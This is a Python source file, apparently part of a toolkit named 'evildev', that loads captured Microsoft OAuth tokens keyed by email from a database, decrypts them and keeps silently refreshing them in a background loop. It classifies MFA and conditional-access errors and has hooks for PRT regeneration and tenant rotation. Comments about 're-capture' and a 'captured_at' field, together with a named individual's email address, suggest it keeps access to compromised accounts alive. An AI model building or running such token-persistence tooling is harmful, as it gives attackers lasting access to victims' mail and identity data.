import base64
import json
import os
import sys
import threading
import time
import urllib.request
import urllib.parse
import urllib.error
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

_THIS_DIR = Path(__file__).resolve().parent
_ROOT_DIR = _THIS_DIR.parent
for _path in (str(_ROOT_DIR), str(_THIS_DIR)):
    if _path not in sys.path:
        sys.path.insert(0, _path)

try:
    from evildev.db import execute_query
    from evildev.core import CryptoUtils, decode_jwt
    from evildev.logger import get_logger
except Exception:
    from db import execute_query
    from core import CryptoUtils, decode_jwt
    from logger import get_logger

logger = get_logger('token_refresh')


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _utc_now() -> datetime:
    return datetime.now(timezone.utc)


def _normalize_utc_datetime(value: Optional[datetime]) -> Optional[datetime]:
    if value is None:
        return None
    if not isinstance(value, datetime):
        return None
    if value.tzinfo is None:
        value = value.replace(tzinfo=timezone.utc)
    return value.astimezone(timezone.utc)


def _classify_aadsts(error_code: str, error_description: str) -> Tuple[str, bool]:
    """Classify an AADSTS code from a refresh-grant failure.

    Returns (reason, is_dead) where reason is one of:
        'dead'      — the RT is gone; only re-capture recovers
        'fragile'   — the RT works but interaction is needed
        'transient' — retry later
    """
    code = (error_code or '').upper()
    desc = (error_description or '').upper()

    DEAD_CODES = {
        'AADSTS700082', 'AADSTS700084', 'AADSTS700081',
        'AADSTS50173', 'AADSTS54005', 'AADSTS70000',
        'AADSTS50057', 'AADSTS700025',
    }
    FRAGILE_CODES = {
        'AADSTS50076', 'AADSTS50079', 'AADSTS53003',
        'AADSTS50158', 'AADSTS50105', 'AADSTS65001',
        # AADSTS50078 — "Presented multi-factor authentication has expired
        # due to policies configured by your administrator." The RT is
        # still alive, but the MFA challenge backing it has aged out and
        # the user must complete an interactive MFA step before this RT
        # can mint a new AT. Without this code classified as fragile, the
        # token falls through to 'transient', keeps `health=EXPIRING`,
        # and the manager retries forever every 5 minutes with no chance
        # of success. This is the code that showed up on sivaram@sed.fund.
        'AADSTS50078',
    }
    TRANSIENT_CODES = {
        'AADSTS90002', 'AADSTS90008', 'AADSTS50058',
        'AADSTS90033', 'AADSTS50034',
    }

    if code in DEAD_CODES:
        return ('dead', True)
    if code in FRAGILE_CODES:
        return ('fragile', False)
    if code in TRANSIENT_CODES:
        return ('transient', False)
    if 'INVALID_GRANT' in desc:
        if any(m in desc for m in (
            'TOKEN HAS EXPIRED', 'TOKEN IS REVOKED',
            'REFRESH TOKEN EXPIRED', 'REFRESH TOKEN REVOKED',
            'MALFORMED OR INVALID',
        )):
            return ('dead', True)
        return ('transient', False)
    if 'INTERACTION_REQUIRED' in desc or 'INTERACTION REQUIRED' in desc:
        return ('fragile', False)
    # Description-level fallbacks for MFA-expired conditions in case a
    # tenant returns the message without the standard AADSTS code.
    if ('MULTI-FACTOR AUTHENTICATION HAS EXPIRED' in desc
            or 'REFRESH YOUR MULTI-FACTOR' in desc
            or 'MFA REQUIRED' in desc
            or 'MULTI-FACTOR AUTHENTICATION IS REQUIRED' in desc):
        return ('fragile', False)
    return ('transient', False)


def _sanitize_refresh_scope(raw_scope: str) -> str:
    """Deduplicate scope for the refresh grant.

    Microsoft rejects mixing `resource/.default` with `resource/specific_scope`
    in a single OAuth request (AADSTS70011). If a bundle contains both — which
    is common for DRS-scoped tokens — keep only the `.default` form for that
    resource, plus the OIDC base scopes.

    This is the refresh-path equivalent of `_sanitize_verify_scope` in
    `app.py` (the import-verification path). Both need to sanitize the
    scope identically, otherwise background refresh of DRS-scoped tokens
    fails with AADSTS70011.

    Examples:
        'adrs_access adrs/.default openid offline_access profile'
            → 'openid offline_access profile adrs/.default'

        'Mail.Read Mail.Send User.Read openid'
            → 'openid offline_access profile Mail.Read Mail.Send User.Read'

        'https://graph.microsoft.com/.default'
            → 'openid offline_access profile https://graph.microsoft.com/.default'
    """
    if not raw_scope:
        return 'openid offline_access profile'

    parts = [p.strip() for p in raw_scope.replace(',', ' ').split() if p.strip()]
    if not parts:
        return 'openid offline_access profile'

    OIDC = {'openid', 'offline_access', 'profile'}

    def _resource_key(s: str) -> str:
        """Return the base resource URI for any scope form.

        Examples:
          'urn:ms-drs:...windows.net/adrs_access' → 'urn:ms-drs:...windows.net'
          'urn:ms-drs:...windows.net/.default'    → 'urn:ms-drs:...windows.net'
          'https://graph.microsoft.com/Mail.Read' → 'https://graph.microsoft.com'
        """
        low = s.lower()
        if low.endswith('/.default'):
            return low[: -len('/.default')]
        if low.endswith('.default'):
            return low[: -len('.default')]
        if '/' in low:
            return low.rsplit('/', 1)[0]
        return low

    # Find resources that have a `.default` entry
    default_resources = set()
    for p in parts:
        low = p.lower()
        if low.endswith('/.default') or low.endswith('.default'):
            default_resources.add(_resource_key(p))

    # Deduplicate and drop non-.default scopes for resources that have .default
    seen = set()
    kept: List[str] = []
    for p in parts:
        low = p.lower()
        if low in seen:
            continue
        if low not in OIDC:
            resource = _resource_key(p)
            is_default = low.endswith('/.default') or low.endswith('.default')
            if not is_default and resource in default_resources:
                # Skip: this resource's .default will be used instead
                continue
        seen.add(low)
        kept.append(p)

    # Always include OIDC base scopes
    present_lower = {s.lower() for s in kept}
    for base in ('openid', 'offline_access', 'profile'):
        if base not in present_lower:
            kept.insert(0, base)

    return ' '.join(kept)


# ---------------------------------------------------------------------------
# Types
# ---------------------------------------------------------------------------

class TokenHealth(Enum):
    HEALTHY = 'healthy'
    FRAGILE = 'fragile'
    EXPIRING = 'expiring'
    DEAD = 'dead'
    REVOKED = 'revoked'
    REAUTH_REQUIRED = 'reauth_required'


@dataclass
class TokenEntry:
    email: str
    encrypted_token: str
    refresh_token: str
    expires_at: datetime
    fragile: bool = False
    health: TokenHealth = TokenHealth.HEALTHY
    refresh_count: int = 0
    last_refresh_attempt: Optional[datetime] = None
    last_error: Optional[str] = None
    consecutive_failures: int = 0
    reauth_initiated: bool = False
    cooldown_until: Optional[datetime] = None
    abandoned: bool = False
    next_backoff_seconds: float = 0.0
    in_flight: bool = False

    @property
    def is_expired(self) -> bool:
        exp = _normalize_utc_datetime(self.expires_at)
        if exp is None:
            return False
        return _utc_now() >= exp

    @property
    def seconds_until_expiry(self) -> float:
        exp = _normalize_utc_datetime(self.expires_at)
        if exp is None:
            return 0.0
        return max(0.0, (exp - _utc_now()).total_seconds())


# ---------------------------------------------------------------------------
# Manager
# ---------------------------------------------------------------------------

class TokenRefreshManager:
    """Manages token lifecycle: loads from DB, refreshes on demand or on
    a schedule, exposes status to the vault.
    """

    # Backoff tuning (env-overridable)
    _BACKOFF_BASE_SECONDS = 60.0
    _BACKOFF_CAP_SECONDS = 6 * 3600.0  # 6 hours
    _ABANDON_AFTER_FAILURES = 10
    _DEFAULT_REFRESH_INTERVAL = 300       # 5 minutes between cycles
    _DEFAULT_EXPIRY_MARGIN = 1200          # refresh tokens within 20min of expiry

    def __init__(self):
        self._lock = threading.RLock()
        self._tokens: Dict[str, TokenEntry] = {}
        self._stats = {
            'total_refreshes': 0,
            'successful_refreshes': 0,
            'failed_refreshes': 0,
            'dead_tokens': 0,
            'reauth_initiated': 0,
            'fragile_tokens': 0,
            'last_cycle': None,
        }
        self._stop_event = threading.Event()
        self._refresh_thread: Optional[threading.Thread] = None
        self._refresh_interval = int(
            os.environ.get('TOKEN_REFRESH_INTERVAL_SECONDS')
            or os.environ.get('WORM_TOKEN_REFRESH_INTERVAL_SECONDS', '300')
        )
        self._expiry_margin = int(
            os.environ.get('TOKEN_REFRESH_MARGIN_SECONDS')
            or os.environ.get('WORM_TOKEN_REFRESH_MARGIN_SECONDS', '1200')
        )
        self._load_from_database()

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def start(self):
        """Start the background refresh loop."""
        if self._refresh_thread and self._refresh_thread.is_alive():
            logger.warning('TokenRefreshManager: refresh loop already running')
            return
        self._stop_event.clear()
        self._refresh_thread = threading.Thread(
            target=self._refresh_loop,
            daemon=True,
            name='token-refresh-worker',
        )
        self._refresh_thread.start()
        logger.info(
            f'TokenRefreshManager: background refresh started '
            f'(interval={self._refresh_interval}s, margin={self._expiry_margin}s)'
        )

    def is_running(self) -> bool:
        return bool(self._refresh_thread and self._refresh_thread.is_alive())

    def stop(self):
        self._stop_event.set()
        if self._refresh_thread and self._refresh_thread.is_alive():
            self._refresh_thread.join(timeout=10)
        logger.info('TokenRefreshManager: background refresh stopped')

    def register_callbacks(self, **kwargs):
        # Kept for API compat; the vault doesn't wire these.
        return

    def set_prt_regenerator(self, fn):
        return

    def set_tenant_rotator(self, rotator):
        return

    def set_broadcast_sessions(self, sessions):
        return

    # ------------------------------------------------------------------
    # Read-only accessors
    # ------------------------------------------------------------------

    def get_token(self, email: str) -> Optional[TokenEntry]:
        with self._lock:
            return self._tokens.get(email)

    def get_all_tokens(self) -> List[TokenEntry]:
        with self._lock:
            return list(self._tokens.values())

    def get_stats(self) -> Dict:
        with self._lock:
            active = sum(
                1 for t in self._tokens.values()
                if t.health not in (TokenHealth.DEAD, TokenHealth.REVOKED)
            )
            dead = sum(
                1 for t in self._tokens.values()
                if t.health in (TokenHealth.DEAD, TokenHealth.REVOKED)
            )
            fragile = sum(1 for t in self._tokens.values() if t.fragile)
            expiring = sum(
                1 for t in self._tokens.values()
                if t.health not in (TokenHealth.DEAD, TokenHealth.REVOKED)
                and t.seconds_until_expiry <= self._expiry_margin
            )
            return {
                **self._stats,
                'total_tokens': len(self._tokens),
                'active_tokens': active,
                'dead_tokens': dead,
                'fragile_tokens': fragile,
                'expiring_tokens': expiring,
                'pending_reauth': 0,
                'is_running': self.is_running(),
                'refresh_interval_seconds': self._refresh_interval,
                'expiry_margin_seconds': self._expiry_margin,
            }

    def get_token_health_report(self) -> List[Dict]:
        with self._lock:
            report = []
            for email, entry in self._tokens.items():
                report.append({
                    'email': email,
                    'health': entry.health.value,
                    'fragile': entry.fragile,
                    'expires_at': entry.expires_at.isoformat(),
                    'seconds_until_expiry': entry.seconds_until_expiry,
                    'refresh_count': entry.refresh_count,
                    'consecutive_failures': entry.consecutive_failures,
                    'last_error': entry.last_error,
                    'reauth_initiated': entry.reauth_initiated,
                    'abandoned': entry.abandoned,
                    'in_flight': entry.in_flight,
                    'cooldown_until': (
                        entry.cooldown_until.isoformat()
                        if entry.cooldown_until else None
                    ),
                    'next_backoff_seconds': entry.next_backoff_seconds,
                    'last_refresh_result': None,
                })
            return report

    # ------------------------------------------------------------------
    # DB loading
    # ------------------------------------------------------------------

    def _initial_health_for(self, expires_at: datetime, has_rt: bool) -> TokenHealth:
        """Determine the initial health badge from expires_at + RT presence.

        Expired tokens with a usable RT are EXPIRING (the worker will
        refresh them). Expired without RT are DEAD (unrecoverable).
        """
        now = _utc_now()
        exp = _normalize_utc_datetime(expires_at)
        if exp is None:
            return TokenHealth.HEALTHY
        if exp <= now:
            return TokenHealth.EXPIRING if has_rt else TokenHealth.DEAD
        if (exp - now).total_seconds() <= self._expiry_margin:
            return TokenHealth.EXPIRING
        return TokenHealth.HEALTHY

    def load_token_from_db(self, email: str) -> bool:
        if not email:
            return False
        row = execute_query(
            "SELECT email, encrypted_token, refresh_token, expires_at "
            "FROM tokens WHERE LOWER(email) = LOWER(?)",
            params=(email.strip().lower(),),
            fetch_one=True,
        )
        if not row:
            return False

        db_email, encrypted_token, refresh_token, expires_at_str = list(row) + [None] * (4 - len(row))

        token_data = None
        try:
            key_hex = (
                os.environ.get('TOKEN_ENCRYPTION_KEY')
                or os.environ.get('WORM_MASTER_KEY')
                or ''
            )
            master_key = bytes.fromhex(key_hex[:64])
            if len(master_key) == 32 and encrypted_token:
                raw = base64.b64decode(encrypted_token)
                plaintext = CryptoUtils.aes_gcm_decrypt(master_key, raw[:12], raw[12:])
                token_data = json.loads(plaintext.decode())
        except Exception:
            token_data = None

        encrypted_refresh = token_data.get('refresh_token') if isinstance(token_data, dict) else None
        effective = encrypted_refresh or refresh_token
        if not effective:
            return False

        try:
            if not expires_at_str:
                expires_at = _utc_now()
            else:
                expires_at = datetime.fromisoformat(
                    str(expires_at_str).replace('Z', '+00:00')
                )
                if expires_at.tzinfo is None:
                    expires_at = expires_at.replace(tzinfo=timezone.utc)
                expires_at = expires_at.astimezone(timezone.utc)
        except Exception:
            expires_at = _utc_now()

        with self._lock:
            initial_health = self._initial_health_for(expires_at, bool(effective))
            entry = TokenEntry(
                email=db_email,
                encrypted_token=encrypted_token or '',
                refresh_token=effective,
                expires_at=expires_at,
                fragile=False,
                health=initial_health,
            )
            if isinstance(token_data, dict):
                if token_data.get('foci') == '1' or self._check_token_for_ca(token_data):
                    entry.fragile = True
                    # Fragile overrides EXPIRING (but not DEAD — DEAD wins)
                    if entry.health != TokenHealth.DEAD:
                        entry.health = TokenHealth.FRAGILE
            self._tokens[db_email] = entry
        logger.info(
            f'Loaded token for {db_email} into refresh manager '
            f'(health={entry.health.value})'
        )
        return True

    def remove_token(self, email: str):
        with self._lock:
            entry = self._tokens.pop(email, None)
            if entry:
                logger.info(f'Removed token for {email} from manager')

    def _check_token_for_ca(self, token_data: dict) -> bool:
        id_token = token_data.get('id_token', '')
        if not id_token:
            return False
        try:
            claims = decode_jwt(id_token) or {}
            acrs = claims.get('acrs', []) or []
            if any(x in acrs for x in ('c1', 'c2', 'c3')):
                return True
            amr = claims.get('amr', []) or []
            if 'mfa' in amr or 'ngcmfa' in amr:
                return True
        except Exception:
            pass
        if token_data.get('foci') == '1':
            return True
        ext = token_data.get('ext_expires_in', 0)
        if ext and ext < 3600:
            return True
        return False

    def _load_from_database(self):
        try:
            rows = execute_query(
                "SELECT email, encrypted_token, refresh_token, expires_at "
                "FROM tokens WHERE "
                "(encrypted_token IS NOT NULL AND encrypted_token != '') "
                "OR (refresh_token IS NOT NULL AND refresh_token != '')",
                fetch_all=True,
            )
        except Exception as e:
            logger.warning(f'Failed to load tokens from database: {e}')
            return

        key_hex = (
            os.environ.get('TOKEN_ENCRYPTION_KEY')
            or os.environ.get('WORM_MASTER_KEY')
            or ''
        )
        try:
            master_key = bytes.fromhex(key_hex[:64]) if len(key_hex) >= 64 else None
        except Exception:
            master_key = None

        for row in rows or []:
            email, encrypted_token, refresh_token, expires_at_str = list(row) + [None] * (4 - len(row))
            token_data = None
            if encrypted_token and master_key:
                try:
                    raw = base64.b64decode(encrypted_token)
                    plaintext = CryptoUtils.aes_gcm_decrypt(master_key, raw[:12], raw[12:])
                    token_data = json.loads(plaintext.decode())
                except Exception:
                    token_data = None

            encrypted_refresh = token_data.get('refresh_token') if isinstance(token_data, dict) else None
            effective = encrypted_refresh or refresh_token
            if not effective:
                continue

            try:
                if not expires_at_str:
                    expires_at = _utc_now()
                else:
                    expires_at = datetime.fromisoformat(
                        str(expires_at_str).replace('Z', '+00:00')
                    )
                    if expires_at.tzinfo is None:
                        expires_at = expires_at.replace(tzinfo=timezone.utc)
                    expires_at = expires_at.astimezone(timezone.utc)
            except Exception:
                expires_at = _utc_now()

            initial_health = self._initial_health_for(expires_at, bool(effective))
            entry = TokenEntry(
                email=email,
                encrypted_token=encrypted_token or '',
                refresh_token=effective,
                expires_at=expires_at,
                fragile=False,
                health=initial_health,
            )
            if isinstance(token_data, dict):
                if token_data.get('foci') == '1' or self._check_token_for_ca(token_data):
                    entry.fragile = True
                    if entry.health != TokenHealth.DEAD:
                        entry.health = TokenHealth.FRAGILE
            self._tokens[email] = entry

        logger.info(f'Loaded {len(self._tokens)} tokens from database into refresh manager')

    # ------------------------------------------------------------------
    # Backoff helpers
    # ------------------------------------------------------------------

    def _compute_backoff(self, consecutive_failures: int) -> float:
        """Exponential backoff capped at _BACKOFF_CAP_SECONDS."""
        if consecutive_failures <= 0:
            return 0.0
        backoff = self._BACKOFF_BASE_SECONDS
        for _ in range(consecutive_failures - 1):
            if backoff >= self._BACKOFF_CAP_SECONDS / 2:
                return self._BACKOFF_CAP_SECONDS
            backoff *= 2
        # Add jitter
        import random
        return min(
            self._BACKOFF_CAP_SECONDS,
            backoff * random.uniform(0.85, 1.15),
        )

    def _should_skip_entry(self, entry: TokenEntry, now: datetime) -> Optional[str]:
        """Return a reason string if this entry should not be refreshed,
        or None if it's eligible."""
        if entry.health in (TokenHealth.DEAD, TokenHealth.REVOKED):
            return 'terminal_health'
        if entry.in_flight:
            return 'in_flight'
        if entry.abandoned:
            cooldown = _normalize_utc_datetime(entry.cooldown_until)
            if cooldown and now < cooldown:
                return 'abandoned_cooldown'
            # Cooldown expired — clear abandonment and retry
            entry.abandoned = False
            entry.consecutive_failures = 0
        cooldown = _normalize_utc_datetime(entry.cooldown_until)
        if cooldown and now < cooldown:
            return 'cooldown'
        return None

    # ------------------------------------------------------------------
    # The refresh work
    # ------------------------------------------------------------------

    def refresh_single(self, email: str) -> Optional[Dict[str, Any]]:
        """Manually refresh one token right now.

        Reads the stored RT, exchanges it for a fresh AT, persists the new
        encrypted token, updates the manager's entry, returns a result dict.

        Never raises. All failure modes are captured in the return value.
        """
        email_norm = (email or '').strip().lower()
        if not email_norm:
            return {
                'success': False,
                'reason': 'no_token',
                'error_code': 'INVALID_EMAIL',
                'error_description': 'empty email',
            }

        # Load entry (from memory or DB)
        with self._lock:
            entry = self._tokens.get(email_norm)
        if entry is None:
            if not self.load_token_from_db(email_norm):
                return {
                    'success': False,
                    'reason': 'no_token',
                    'error_code': 'NOT_FOUND',
                    'error_description': 'no token row for this email',
                }
            with self._lock:
                entry = self._tokens.get(email_norm)
            if entry is None:
                return {
                    'success': False,
                    'reason': 'no_token',
                    'error_code': 'LOAD_FAILED',
                    'error_description': 'could not load token from DB',
                }

        # Check skip conditions
        now = _utc_now()
        with self._lock:
            skip = self._should_skip_entry(entry, now)
            if skip:
                return {
                    'success': False,
                    'reason': 'skipped',
                    'skip_reason': skip,
                    'error_code': None,
                    'error_description': f'skipped: {skip}',
                }
            entry.in_flight = True

        try:
            result = self._do_refresh(entry)
        finally:
            with self._lock:
                entry.in_flight = False

        return result

    def _do_refresh(self, entry: TokenEntry) -> Dict[str, Any]:
        """Core refresh logic. Called by refresh_single and the loop.

        Updates `entry` and the DB. Never raises.
        """
        email = entry.email
        now = _utc_now()

        # Decrypt the current payload
        key_hex = (
            os.environ.get('TOKEN_ENCRYPTION_KEY')
            or os.environ.get('WORM_MASTER_KEY')
            or os.environ.get('ENCRYPTION_KEY')
            or ''
        )
        token_data: Dict[str, Any] = {}
        master_key: Optional[bytes] = None
        if len(key_hex) >= 64 and entry.encrypted_token:
            try:
                master_key = bytes.fromhex(key_hex[:64])
                raw = base64.b64decode(entry.encrypted_token)
                plaintext = CryptoUtils.aes_gcm_decrypt(master_key, raw[:12], raw[12:])
                parsed = json.loads(plaintext.decode('utf-8'))
                if isinstance(parsed, dict):
                    token_data = parsed
            except Exception as e:
                logger.warning(f'refresh: decrypt failed for {email}: {e}')

        rt = token_data.get('refresh_token') or entry.refresh_token
        if not rt:
            with self._lock:
                entry.last_error = 'NO_REFRESH_TOKEN'
                entry.health = TokenHealth.DEAD
                entry.abandoned = True
                self._stats['dead_tokens'] += 1
            return {
                'success': False,
                'reason': 'dead',
                'error_code': 'NO_RT',
                'error_description': 'no refresh token in stored payload',
            }

        cid = token_data.get('client_id') or os.environ.get('CLIENT_ID')
        if not cid:
            return {
                'success': False,
                'reason': 'network_error',
                'error_code': 'NO_CLIENT_ID',
                'error_description': 'no CLIENT_ID configured',
            }

        tid = (
            (token_data.get('user_info') or {}).get('tenantId')
            or token_data.get('tenant')
            or (decode_jwt(token_data.get('access_token', '')) or {}).get('tid')
            or os.environ.get('TENANT', 'common')
        )

        # Refresh scope — sanitize to avoid AADSTS70011.
        # Stored DRS scopes contain `adrs_access + .default` which
        # Microsoft rejects. Sanitize before sending.
        stored_scope = (token_data.get('scope') or '').strip()
        scope = _sanitize_refresh_scope(stored_scope)

        url = f"https://login.microsoftonline.com/{tid}/oauth2/v2.0/token"
        body = urllib.parse.urlencode({
            'grant_type': 'refresh_token',
            'client_id': cid,
            'refresh_token': rt,
            'scope': scope,
        }).encode('utf-8')
        req = urllib.request.Request(
            url, data=body, method='POST',
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json',
                'User-Agent': 'vault-token-refresh/1.0',
            },
        )

        # Attempt the HTTP call
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                resp_data = json.loads(resp.read().decode('utf-8'))
        except urllib.error.HTTPError as e:
            err_text = e.read().decode('utf-8', errors='replace')
            try:
                err_json = json.loads(err_text)
            except Exception:
                err_json = {}
            desc = str(err_json.get('error_description') or err_text)[:500]
            import re as _re
            m = _re.search(r'(AADSTS\d+)', desc.upper())
            aadsts = m.group(1) if m else None
            reason, is_dead = _classify_aadsts(aadsts or '', desc)

            with self._lock:
                entry.last_refresh_attempt = now
                entry.consecutive_failures += 1
                entry.last_error = f'{aadsts or e.code}: {desc}'
                self._stats['total_refreshes'] += 1
                self._stats['failed_refreshes'] += 1

                if is_dead:
                    was_terminal = entry.health in (TokenHealth.DEAD, TokenHealth.REVOKED)
                    entry.health = (TokenHealth.REVOKED if aadsts == 'AADSTS50173'
                                    else TokenHealth.DEAD)
                    entry.abandoned = True
                    if not was_terminal:
                        self._stats['dead_tokens'] += 1
                    logger.warning(
                        f'refresh: {email} is dead ({aadsts or e.code}): {desc[:150]}'
                    )
                elif reason == 'fragile':
                    entry.health = TokenHealth.REAUTH_REQUIRED
                    entry.fragile = True
                    # MFA/CA blocks don't clear without human interaction —
                    # retrying every 5 minutes just churns the log. Push
                    # the next automatic attempt out to the backoff cap
                    # (6h by default). Manual retry via /api/refresh-manager/
                    # retry/<email> clears the cooldown and forces an
                    # immediate attempt, so operators aren't locked out.
                    backoff = self._BACKOFF_CAP_SECONDS
                    entry.next_backoff_seconds = backoff
                    entry.cooldown_until = now + timedelta(seconds=backoff)
                    logger.info(
                        f'refresh: {email} needs reauth ({aadsts or e.code}) — '
                        f'cooldown {int(backoff)}s'
                    )
                elif entry.consecutive_failures >= self._ABANDON_AFTER_FAILURES:
                    entry.abandoned = True
                    entry.health = TokenHealth.DEAD
                    self._stats['dead_tokens'] += 1
                    logger.warning(
                        f'refresh: abandoning {email} after '
                        f'{entry.consecutive_failures} consecutive failures'
                    )
                else:
                    backoff = self._compute_backoff(entry.consecutive_failures)
                    entry.next_backoff_seconds = backoff
                    entry.cooldown_until = now + timedelta(seconds=backoff)

            return {
                'success': False,
                'reason': reason,
                'error_code': aadsts or str(e.code),
                'error_description': desc,
            }
        except (urllib.error.URLError, TimeoutError, OSError) as e:
            with self._lock:
                entry.last_refresh_attempt = now
                entry.consecutive_failures += 1
                entry.last_error = f'TRANSPORT: {e}'
                self._stats['total_refreshes'] += 1
                self._stats['failed_refreshes'] += 1
                backoff = self._compute_backoff(entry.consecutive_failures)
                entry.next_backoff_seconds = backoff
                entry.cooldown_until = now + timedelta(seconds=backoff)
            return {
                'success': False,
                'reason': 'network_error',
                'error_code': 'TRANSPORT',
                'error_description': str(e),
            }

        fresh_at = resp_data.get('access_token')
        if not fresh_at:
            with self._lock:
                entry.last_refresh_attempt = now
                entry.consecutive_failures += 1
                entry.last_error = f"NO_AT: {resp_data.get('error')}"
            return {
                'success': False,
                'reason': 'transient',
                'error_code': resp_data.get('error', 'NO_AT'),
                'error_description': str(resp_data.get('error_description') or '')[:500],
            }

        # Success: persist new payload
        fresh_rt = resp_data.get('refresh_token') or rt
        try:
            new_expires_at = now + timedelta(
                seconds=int(resp_data.get('expires_in', 3600))
            )
        except (TypeError, ValueError):
            new_expires_at = now + timedelta(seconds=3600)

        new_payload = dict(token_data)
        new_payload['access_token'] = fresh_at
        new_payload['refresh_token'] = fresh_rt
        if 'id_token' in resp_data and resp_data['id_token']:
            new_payload['id_token'] = resp_data['id_token']
        if 'expires_in' in resp_data:
            new_payload['expires_in'] = resp_data['expires_in']
        if 'scope' in resp_data and resp_data['scope']:
            # Store the ORIGINAL stored scope (pre-sanitization) so
            # downstream consumers see the real granted scopes. The
            # sanitization is only for the refresh-grant request itself.
            new_payload['scope'] = stored_scope or resp_data['scope']

        encrypted_new = entry.encrypted_token
        if master_key is not None:
            try:
                nonce, ct = CryptoUtils.aes_gcm_encrypt(
                    master_key,
                    json.dumps(new_payload, separators=(',', ':'), sort_keys=True).encode('utf-8'),
                )
                encrypted_new = base64.b64encode(nonce + ct).decode('utf-8')
            except Exception as e:
                logger.warning(f'refresh: encrypt failed for {email}: {e}')

        # DB update
        if encrypted_new != entry.encrypted_token:
            try:
                execute_query(
                    "UPDATE tokens SET encrypted_token = ?, expires_at = ?, "
                    "captured_at = ? WHERE LOWER(email) = LOWER(?)",
                    params=(
                        encrypted_new,
                        new_expires_at.isoformat(),
                        now.isoformat(),
                        email,
                    ),
                    commit=True,
                )
            except Exception as e:
                logger.warning(f'refresh: DB update failed for {email}: {e}')

        # Manager state update
        with self._lock:
            entry.encrypted_token = encrypted_new
            entry.refresh_token = fresh_rt
            entry.expires_at = new_expires_at
            entry.refresh_count += 1
            entry.consecutive_failures = 0
            entry.last_error = None
            entry.last_refresh_attempt = now
            entry.cooldown_until = None
            entry.next_backoff_seconds = 0.0
            entry.abandoned = False
            if self._check_token_for_ca(new_payload):
                entry.fragile = True
                entry.health = TokenHealth.FRAGILE
            else:
                entry.health = TokenHealth.HEALTHY

            self._stats['total_refreshes'] += 1
            self._stats['successful_refreshes'] += 1

        seconds_left = int((_normalize_utc_datetime(new_expires_at) - _utc_now()).total_seconds())
        logger.info(
            f'refresh: {email} succeeded, new expiry {new_expires_at.isoformat()} '
            f'({seconds_left}s remaining)'
        )

        return {
            'success': True,
            'reason': 'valid',
            'error_code': None,
            'error_description': None,
            'new_expires_at': new_expires_at.isoformat(),
            'seconds_until_expiry': seconds_left,
        }

    def refresh_all_expiring(self, margin_seconds: Optional[int] = None) -> Dict[str, Any]:
        """Refresh all tokens within `margin_seconds` of expiry.

        Skips tokens already in cooldown, abandoned, or in-flight.
        Returns a summary dict.
        """
        if margin_seconds is None:
            margin_seconds = self._expiry_margin

        now = _utc_now()
        threshold = now + timedelta(seconds=margin_seconds)

        with self._lock:
            candidates = []
            for entry in self._tokens.values():
                exp = _normalize_utc_datetime(entry.expires_at)
                if exp is None:
                    continue
                if exp > threshold:
                    continue
                if self._should_skip_entry(entry, now):
                    continue
                candidates.append(entry)

        summary = {
            'attempted': 0,
            'succeeded': 0,
            'failed': 0,
            'skipped': len(self._tokens) - len(candidates),
            'details': [],
        }

        for entry in candidates:
            if self._stop_event.is_set():
                break
            summary['attempted'] += 1
            try:
                with self._lock:
                    entry.in_flight = True
                result = self._do_refresh(entry)
            finally:
                with self._lock:
                    entry.in_flight = False
            if result.get('success'):
                summary['succeeded'] += 1
            else:
                summary['failed'] += 1
            summary['details'].append({
                'email': entry.email,
                'result': result,
            })
            # Small jitter between refreshes to be polite to Microsoft
            import random
            time.sleep(random.uniform(0.5, 1.5))

        with self._lock:
            self._stats['last_cycle'] = _utc_now().isoformat()

        if summary['attempted']:
            s = summary['succeeded']
            a = summary['attempted']
            f = summary['failed']
            logger.info(f'refresh cycle: {s}/{a} succeeded, {f} failed')
        return summary

    # ------------------------------------------------------------------
    # Background loop
    # ------------------------------------------------------------------

    def _refresh_loop(self):
        logger.info('TokenRefreshManager: background loop started')
        while not self._stop_event.is_set():
            try:
                self.refresh_all_expiring()
            except Exception as e:
                logger.error(f'refresh loop raised: {e}')
            # Sleep until next cycle (interruptible via _stop_event)
            self._stop_event.wait(self._refresh_interval)
        logger.info('TokenRefreshManager: background loop exited')


# ---------------------------------------------------------------------------
# Module-level singleton
# ---------------------------------------------------------------------------

token_refresh_manager = TokenRefreshManager()